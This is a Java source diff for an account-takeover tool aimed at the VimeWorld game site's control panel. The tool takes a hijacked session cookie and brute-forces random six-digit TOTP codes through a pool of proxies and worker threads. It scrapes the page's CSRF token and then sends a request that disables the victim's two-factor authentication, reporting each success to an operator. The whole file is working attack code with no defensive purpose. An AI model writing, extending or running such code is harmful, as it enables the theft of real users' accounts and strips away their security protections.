@@ -10,6 +10,7 @@ import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.stream.Collectors;
 
 import static pro.delfik.net.NetUtil.*;
@@ -23,12 +24,15 @@ public class VimeWorldLogin extends PostArchetype {
 	public static final CookieCutter cfduid = new CookieCutter("__cfduid", "ID сессии CloudFlare");
 	public static final CookieCutter sessionCookie = new CookieCutter("PHPSESSID", "ID сессии VimeWorld");
 	public static volatile int passed;
+	private volatile String csrfToken;
+	private volatile boolean forwardMode;
 
 	public VimeWorldLogin(String session) {
 		super(sessionCookie.cut(session));
 	}
 
 	public static Worker[] workers;
+	public static volatile Queue<Proxy> QUEUED_PROXIES = new ConcurrentLinkedQueue<>();
 	public static String nickname;
 	private static volatile boolean blocked;
 
@@ -37,7 +41,7 @@ public class VimeWorldLogin extends PostArchetype {
 		for (Worker worker : workers) if (worker != null) worker.block();
 	}
 
-	public static void main(String... args) {
+	public static void main(String... args) throws Exception {
 		List<String> proxiesAddr = DataIO.read("proxies.txt");
 		List<Proxy> proxies = proxiesAddr == null ? new ArrayList<>() : proxiesAddr.stream().map(p -> {
 			String[] split = p.split(":");
@@ -56,13 +60,25 @@ public class VimeWorldLogin extends PostArchetype {
 		VimeWorldLogin at = new VimeWorldLogin(session);
 		report("\uD83D\uDC68\u200D\uD83D\uDD27 Новый рабочий - " + nickname + "\n\uD83C\uDF0D Количество прокси - " + proxies.size(), false);
 
+		at.lifecycle(Proxy.NO_PROXY, "testcode");
 
-		workers = new Worker[proxies.size()];
+		workers = new Worker[10];
 		for (int i = 0; i < workers.length; i++) {
 			Proxy proxy = proxies.get(i);
-			workers[0] = new Worker(() -> at.lifecycle(proxy, at.randomTotpCode(), false), proxy.toString(), 300);
-			workers[0].start();
+			workers[i] = new Worker(at);
+			workers[i].start();
 		}
+
+		new Thread(() -> {
+			while (true) {
+				QUEUED_PROXIES = new ConcurrentLinkedQueue<>(proxies);
+				try {
+					Thread.sleep(1000);
+				} catch (InterruptedException e) {
+					break;
+				}
+			}
+		}).start();
 
 		new Thread(() -> {
 			while (!blocked) {
@@ -93,7 +109,7 @@ public class VimeWorldLogin extends PostArchetype {
 			//			at.lifecycle(Proxy.NO_PROXY, next);
 			//			Response r = at.execute(next.split(" ")).execute(Proxy.NO_PROXY);
 			System.out.println("Custom code: " + next);
-			at.lifecycle(Proxy.NO_PROXY, next, true);
+			at.lifecycle(Proxy.NO_PROXY, next);
 			//			System.out.println(r);
 			//			System.out.println(new String(r.getBody()));
 			//			System.out.println(r.getHeader("location"));
@@ -120,7 +136,7 @@ public class VimeWorldLogin extends PostArchetype {
 				request.address(vwSecUrl);
 				request.body("action", "totp-disable");
 				request.body("totp", args[0]);
-				request.body("csrf_token", args[2]); //"3574e714c8f79fff6857bdc1d378f1002ec6df928ba2a541a5013a2351b4a0b2"
+				request.body("csrf_token", args[2]);
 				request.header("referer", "https://cp.vimeworld.ru/security");
 				request.header("x-requested-with", "XMLHttpRequest");
 			} else if (args[1].equals("get")) {
@@ -139,8 +155,12 @@ public class VimeWorldLogin extends PostArchetype {
 		return leadingZeroes((long) (Math.random() * 1_000_000), 6);
 	}
 
-	public void lifecycle(Proxy proxy, String code, boolean custom) {
+	public void lifecycle(Proxy proxy, String code) throws Exception {
 
+		if (forwardMode) {
+			disableTotp(code);
+			return;
+		}
 		Response response = accept(proxy, code);
 		if (blocked) return;
 
@@ -162,33 +182,32 @@ public class VimeWorldLogin extends PostArchetype {
 		String location = response.getHeader("location");
 		System.out.println(Thread.currentThread().getName() + " - " + code + ": " + color + http + " \u001b[0m" + location);
 		if ("index".equals(location)) {
-			block();
-			setupDisableTotp(proxy, code);
-			System.out.println("\u001b[32mACCESS GRANTED: " + code);
-			System.exit(0);
+			if (code.equals("testcode")) forwardMode = true;
+			else block();
+			setupDisableTotp(code);
 		}
 	}
 
-	private void setupDisableTotp(Proxy proxy, String code) {
+	private void setupDisableTotp(String code) throws Exception {
 		report("\uD83D\uDEA8 Рабочий " + nickname + " получил доступ к личному кабинету по коду " + code, true);
 		Response response = accept(Proxy.NO_PROXY, code, "get");
 		String html = new String(response.getBody());
 		String s = "csrf_token: '";
 		int index = html.indexOf(s);
 		int offset = index + s.length();
-		String csrfToken = html.substring(offset, offset + 64);
+		csrfToken = html.substring(offset, offset + 64);
 		System.out.println(csrfToken);
 
-		disableTotp(proxy, code, csrfToken);
+		if (!"testcode".equals(code)) disableTotp(code);
 
 	}
 
 	private static final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss dd MMM yyyy");
 
-	private void disableTotp(Proxy proxy, String code, String crsf) {
-		Response res = accept(Proxy.NO_PROXY, code, "off", crsf);
+	private void disableTotp(String code) throws Exception {
+		Response res = accept(Proxy.NO_PROXY, code, "off", csrfToken);
 		String s = new String(res.getBody());
-		try {
+		if (!s.isEmpty()) try {
 			JSONObject jsonObject = new JSONObject(s);
 			String state = jsonObject.getString("state");
 			if (state.equals("success")) {
@@ -197,12 +216,31 @@ public class VimeWorldLogin extends PostArchetype {
 								"✅ Сгенерированный код - " + code + "\n" +
 								"✅ Дата и время отключения - " + sdf.format(new Date()),
 						false);
-			} else report(nickname + ": подошёл чей-то другой код, у меня " + code + " и он не подошёл (ошибка " + jsonObject + ")", true);
+				System.out.println("\u001b[32mACCESS GRANTED: " + code);
+				System.exit(0);
+			} else {
+				String error = jsonObject.getString("msg");
+				if (error.contains("уже")) {
+					System.exit(0);
+				} else if (error.contains("неверный код")) {
+					if (!forwardMode) {
+						unblock();
+						report(nickname + ": подошёл чей-то другой код, у меня " + code + " и он не подошёл (ошибка " + jsonObject + ")", true);
+						forwardMode = true;
+						return;
+					}
+				}
+			}
 
 			System.out.println(s);
 		} catch (JSONException ex) {
-			report("ПРОИЗОШЁЛ ПИЗДЕЦ У " + nickname, false);
+			report("ПРОИЗОШЁЛ ПИЗДЕЦ У " + nickname + ", " + ex.getMessage() + "\n\n" + s, false);
 		}
+	}
+
+	private static void unblock() {
+		blocked = false;
+		for (Worker worker : workers) if (worker != null) worker.unblock();
 	}
 
 	public static String leadingZeroes(long number, int chars) {
